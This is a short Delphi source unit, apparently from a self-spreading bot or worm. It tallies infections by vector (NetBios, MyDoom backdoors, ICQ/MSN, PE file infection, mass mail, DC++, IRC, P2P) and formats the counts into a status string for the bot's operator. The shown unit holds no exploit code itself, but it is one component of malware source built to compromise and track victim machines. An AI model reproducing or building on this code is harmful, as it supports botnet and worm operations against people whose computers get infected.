unit stats_spreader;

interface

Uses
  Windows, Spreader_Bot;

Var
        NetBios_Infect          :Integer=0;
        MyDoom_Infect           :Integer=0;
        ICQMSN_Infect           :Integer=0;
        PE_Infect               :Integer=0;
        DCPP_Infect             :String='n';
        MassMail_Infect         :Integer=0;
        IRC_Infect              :String='n';
        P2P_Infect              :String='n';
        Bot                     :tSock;

Procedure GatherStats(Var Stats: String);

implementation

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function FixLen(Text: String): String;
Begin
  While (Length(Text) < 4) Do
    Text := ' '+Text;
  Result := Text;
End;

Procedure GatherStats(Var Stats: String);
Begin
  Stats := '[nb:'+FixLen(IntToStr(NetBios_Infect))+']'+
           '[md:'+FixLen(IntToStr(MyDoom_Infect))+']'+
           '[im:'+FixLen(IntToStr(ICQMSN_Infect))+']'+
           '[pe:'+FixLen(IntToStr(PE_Infect))+']'+
           '[mm:'+FixLen(IntToStr(MassMail_Infect))+']'+
           '[dc:'+(DCPP_Infect)+'][irc:'+(IRC_Infect)+']'+
           '[p2p:'+(P2P_Infect)+']';
End;

end.
